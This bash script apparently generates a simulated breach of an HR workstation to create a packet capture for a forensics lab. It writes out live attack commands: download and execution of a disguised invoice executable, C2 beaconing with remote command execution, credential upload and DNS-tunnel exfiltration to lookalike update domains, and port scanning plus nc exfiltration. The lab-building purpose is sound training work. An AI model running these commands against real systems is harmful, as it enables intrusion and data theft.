#!/bin/bash

echo "HR-WORKSTATION-01 initializing..."

echo "172.25.1.10 corp-dc-01.internal.corp" >> /etc/hosts
echo "172.25.1.200 microsoft-update-service.net" >> /etc/hosts
echo "172.25.1.200 adobe-security-updates.org" >> /etc/hosts
echo "172.25.1.200 windows-defender-updates.com" >> /etc/hosts
echo "172.25.1.200 chrome-extension-update.net" >> /etc/hosts
echo "172.25.1.3 qayssarayra.com" >> /etc/hosts

mkdir -p /opt/pcaps
tcpdump -i eth0 -w /opt/pcaps/network_capture.pcap -s 0 -B 4096 &
TCPDUMP_PID=$!
echo "Started comprehensive tcpdump with PID: $TCPDUMP_PID"

sleep 15

generate_normal_traffic() {
    SITES=("github.com" "stackoverflow.com" "microsoft.com" "adobe.com" "google.com" "cloudflare.com")
    USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    )
    
    while true; do
        SITE=${SITES[$RANDOM % ${#SITES[@]}]}
        UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
        
        timeout 10 curl -s -A "$UA" \
             -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
             -H "Accept-Language: en-US,en;q=0.5" \
             -H "Accept-Encoding: gzip, deflate" \
             -H "Connection: keep-alive" \
             --connect-timeout 5 --max-time 10 \
             "http://$SITE" > /dev/null 2>&1 || true
        
        sleep $((RANDOM % 60 + 30))
    done
}

spear_phishing_simulation() {
    sleep 5
    echo "[$(date)] User received targeted spear phishing email..."
    
    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         -H "Referer: https://outlook.office365.com" \
         "http://172.25.1.200:8080/campaign/invoice_Q4_2024.pdf.exe" \
         -o /tmp/invoice_Q4_2024.pdf.exe || true
    
    sleep 2
    
    chmod +x /tmp/invoice_Q4_2024.pdf.exe 2>/dev/null || true
    /tmp/invoice_Q4_2024.pdf.exe &
    
    echo "[$(date)] Initial payload executed"
}

establish_c2_channel() {
    sleep 10
    
    SESSION_ID=$(openssl rand -hex 16)
    
    for i in {1..5}; do
        JITTER=$((RANDOM % 10 + 5))
        
        BEACON_DATA=$(echo "hostname=HR-WORKSTATION-01&user=shosho.ahmed&domain=CORP&os=Windows10&build=19045" | base64 -w 0)
        
        curl -s -H "User-Agent: Microsoft BITS/7.8" \
             -H "X-Session-ID: $SESSION_ID" \
             -H "Content-Type: application/x-www-form-urlencoded" \
             -H "X-Request-ID: $(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 32 | head -n 1)" \
             --data "data=$BEACON_DATA" \
             "http://microsoft-update-service.net:8081/api/v1/check" > /tmp/c2_response 2>/dev/null || true
        
        if [ -s /tmp/c2_response ]; then
            COMMAND=$(cat /tmp/c2_response | base64 -d 2>/dev/null | grep -o '"cmd":"[^"]*"' | cut -d'"' -f4 2>/dev/null || true)
            if [ ! -z "$COMMAND" ]; then
                execute_c2_command "$COMMAND"
            fi
        fi
        
        sleep $JITTER
    done
}

execute_c2_command() {
    local cmd="$1"
    case "$cmd" in
        "sysinfo")
            RESULT=$(uname -a | base64 -w 0)
            ;;
        "netinfo")
            RESULT=$(ip addr show | base64 -w 0)
            ;;
        "proclist")
            RESULT=$(ps aux | base64 -w 0)
            ;;
        "download")
            download_additional_payload
            RESULT=$(echo "payload_downloaded" | base64 -w 0)
            ;;
        *)
            RESULT=$(echo "unknown_command" | base64 -w 0)
            ;;
    esac
    
    curl -s -X POST -H "Content-Type: application/json" \
         -H "X-Session-ID: $SESSION_ID" \
         --data "{\"result\":\"$RESULT\",\"timestamp\":\"$(date -u +%Y%m%d%H%M%S)\"}" \
         "http://microsoft-update-service.net:8081/api/v1/result" > /dev/null 2>&1 || true
}

download_additional_payload() {
    sleep 10
    
    curl -s -H "User-Agent: Windows Update Agent" \
         "http://adobe-security-updates.org:8082/updates/KB5034441.msu" \
         -o /tmp/update.msu || true
    
    chmod +x /tmp/update.msu 2>/dev/null || true
    /tmp/update.msu &
}

credential_harvesting() {
    sleep 15
    
    curl -s -H "User-Agent: CredentialHarvester/2.1" \
         -H "X-Password-Key: qaysuruncle" \
         "http://172.25.1.200:8084/tools/vaultkey?key=qaysuruncle" > /dev/null 2>&1 || true
    
    sleep 2
    
    BROWSER_CREDS="{
        \"type\":\"chrome_passwords\",
        \"data\":[
            {\"url\":\"https://portal.corp.internal\",\"username\":\"shosho.ahmed\",\"password\":\"Summer2024!\",\"date_created\":\"2024-01-15\"},
            {\"url\":\"https://payroll.corp.internal\",\"username\":\"shosho.ahmed\",\"password\":\"HR_P@ss123\",\"date_created\":\"2024-02-20\"},
            {\"url\":\"https://banking.chase.com\",\"username\":\"s.ahmed.personal\",\"password\":\"MyPersonal\$2024\",\"date_created\":\"2024-03-10\"}
        ]
    }"
    
    ENCRYPTED_CREDS=$(echo "$BROWSER_CREDS" | openssl enc -aes-256-cbc -a -salt -pass pass:qaysuruncle 2>/dev/null || echo "$BROWSER_CREDS" | base64 -w 0)
    
    curl -s -X POST -H "Content-Type: application/octet-stream" \
         -H "X-Data-Type: credentials" \
         -H "X-Encryption: aes256" \
         --data "$ENCRYPTED_CREDS" \
         "http://windows-defender-updates.com:8082/api/upload" > /dev/null 2>&1 || true
}

dns_tunneling() {
    sleep 20
    
    COMMANDS=("whoami" "net_user" "ipconfig" "systeminfo" "tasklist" "net_group_domain_admins")
    
    for cmd in "${COMMANDS[@]}"; do
        ENCODED=$(echo -n "$cmd" | base64 | tr -d '=' | tr '/+' '_-')
        
        nslookup "${ENCODED}.update.microsoft-update-service.net" 172.25.1.200 > /dev/null 2>&1 || true
        sleep 1
        
        nslookup -type=TXT "response.${ENCODED}.microsoft-update-service.net" 172.25.1.200 > /dev/null 2>&1 || true
        sleep 1
    done
}

lateral_movement_recon() {
    sleep 25
    
    echo "Starting reconnaissance scan at $(date)"
    
    for target in "172.25.1.10" "172.25.1.11" "172.25.1.101" "172.25.1.102"; do
        for port in 22 135 139 445 3389 5985; do
            timeout 2 bash -c "echo '' > /dev/tcp/$target/$port" 2>/dev/null && echo "Port $port open on $target" || true
            sleep 0.2
        done
        sleep 0.5
    done
    
    for host in "172.25.1.10" "172.25.1.11" "172.25.1.101"; do
        echo "admin" | timeout 3 nc -w 3 $host 445 > /dev/null 2>&1 || true
        sleep 1
    done
    
    RECON_DATA="{\"type\":\"network_recon\",\"discovered_hosts\":[\"172.25.1.10\",\"172.25.1.11\",\"172.25.1.101\",\"172.25.1.102\"],\"services\":[\"smb\",\"rdp\",\"ssh\"]}"
    curl -s -X POST -H "Content-Type: application/json" \
         --data "$RECON_DATA" \
         "http://microsoft-update-service.net:8081/api/v1/recon" > /dev/null 2>&1 || true
}

data_staging() {
    sleep 30
    
    STAGED_FILES="{
        \"operation\":\"data_collection\",
        \"files\":[
            {\"path\":\"C:\\\\Users\\\\shosho\\\\Documents\\\\Employee_Database.xlsx\",\"size\":\"2.4MB\",\"hash\":\"d41d8cd98f00b204e9800998ecf8427e\"},
            {\"path\":\"C:\\\\Users\\\\ameed\\\\Desktop\\\\Salary_Report_2024.docx\",\"size\":\"856KB\",\"hash\":\"e99a18c428cb38d5f260853678922e03\"},
            {\"path\":\"C:\\\\Users\\\\Public\\\\Shared\\\\HR_Policies.pdf\",\"size\":\"1.2MB\",\"hash\":\"ab87d24bdc7452e55738deb5f868e1f7\"}
        ],
        \"total_size\":\"4.5MB\",
        \"staging_time\":\"$(date -u +%Y-%m-%d_%H:%M:%S)\"
    }"
    
    curl -s -X POST -H "Content-Type: application/json" \
         -H "X-Operation: data_staging" \
         --data "$STAGED_FILES" \
         "http://chrome-extension-update.net:8083/api/stage" > /dev/null 2>&1 || true
}

malware_deployment() {
    sleep 35
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data '{"hash":"04fb0ccf3ef309b1cd587f609ab0e81e","family":"CRACKSHOT","deployment":"lateral_spread"}' \
         "http://172.25.1.200:8081/malware_deploy" > /dev/null 2>&1 || true
}

data_exfiltration() {
    sleep 40
    
    for i in {1..3}; do
        EXFIL_DATA=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c $((1024 * $i)))
        CHUNK_HASH=$(echo -n "$EXFIL_DATA" | md5sum | cut -d' ' -f1)
        
        case $i in
            1)
                curl -s -X POST -H "Content-Type: application/octet-stream" \
                     -H "X-Chunk-ID: $i" \
                     -H "X-Chunk-Hash: $CHUNK_HASH" \
                     --data-binary "$EXFIL_DATA" \
                     "http://adobe-security-updates.org:8082/api/upload" > /dev/null 2>&1 || true
                ;;
            2)
                echo "$EXFIL_DATA" | nc -w 5 172.25.1.200 9001 > /dev/null 2>&1 || true
                ;;
            3)
                ENCODED_DATA=$(echo -n "$EXFIL_DATA" | head -c 100 | base64 | tr -d '=' | tr '/+' '_-')
                nslookup "data.${ENCODED_DATA}.microsoft-update-service.net" 172.25.1.200 > /dev/null 2>&1 || true
                ;;
        esac
        
        sleep 2
    done
}

golden_ticket_simulation() {
    sleep 50
    
    KRBTGT_HASH="502c2ba5c4e1234567890abcdef12345"
    DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data "{\"attack\":\"golden_ticket\",\"krbtgt_hash\":\"$KRBTGT_HASH\",\"domain\":\"CORP\",\"sid\":\"$DOMAIN_SID\",\"user\":\"Administrator\",\"timestamp\":\"$(date -u)\"}" \
         "http://172.25.1.200:8081/api/v1/persistence" > /dev/null 2>&1 || true
    
    echo "[$(date)] Logon with golden ticket - User: Administrator, Source: 172.25.1.100" >> /var/log/security.log
}

anti_forensics() {
    sleep 55
    
    > /tmp/clear_logs.sh
    echo "#!/bin/bash" > /tmp/clear_logs.sh
    chmod +x /tmp/clear_logs.sh
    /tmp/clear_logs.sh
    
    touch -t 202401150800 /tmp/invoice_Q4_2024.pdf.exe 2>/dev/null || true
    touch -t 202401150800 /tmp/update.msu 2>/dev/null || true
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data "{\"action\":\"cleanup\",\"status\":\"complete\",\"timestamp\":\"$(date -u)\"}" \
         "http://microsoft-update-service.net:8081/api/v1/cleanup" > /dev/null 2>&1 || true
}

contact_incident_response() {
    sleep 60
    
    for attempt in {1..3}; do
        curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
             -H "Host: qayssarayra.com" \
             -H "Referer: https://www.google.com/search?q=cybersecurity+incident+response+expert" \
             "http://172.25.1.3/" > /dev/null 2>&1 || true
        sleep 2
    done
    
    EMAIL_CONTENT="From: ameed.khaled@corp.internal
To: info@qayssarayra.com
Subject: CRITICAL - Advanced Persistent Threat Detected
Date: $(date -R)
Message-ID: <$(date +%s).security@corp.internal>

Dear Cybersecurity Expert,

We have detected sophisticated malicious activity on our corporate network:

- Multiple workstations compromised
- Unusual network traffic patterns
- Potential data exfiltration
- Advanced evasion techniques observed

Urgently need expert incident response assistance.
Please contact: ameed.khaled@corp.internal

Threat indicators:
- Suspicious domains: microsoft-update-service.net, adobe-security-updates.org  
- Malware hashes: 04fb0ccf3ef309b1cd587f609ab0e81e
- Compromised hosts: HR-WORKSTATION-01, FINANCE-PC-02

Time is critical.

Ameed Khaled
IT Security Manager
CORP Enterprise"
    
    EMAIL_B64=$(echo "$EMAIL_CONTENT" | base64 -w 76)
    
    {
        echo "HELO corp.internal"
        echo "MAIL FROM:<ameed.khaled@corp.internal>"  
        echo "RCPT TO:<info@qayssarayra.com>"
        echo "DATA"
        echo "$EMAIL_B64"
        echo "."
        echo "QUIT"
    } | nc -w 10 172.25.1.4 25 > /dev/null 2>&1 || true
}

generate_normal_traffic &
spear_phishing_simulation &
establish_c2_channel &
credential_harvesting &
lateral_movement_recon &
malware_deployment &
data_staging &
dns_tunneling &
data_exfiltration &
golden_ticket_simulation &
anti_forensics &
contact_incident_response &

sleep 180

kill $TCPDUMP_PID 2>/dev/null || true
echo "Advanced traffic capture complete"

tail -f /dev/null
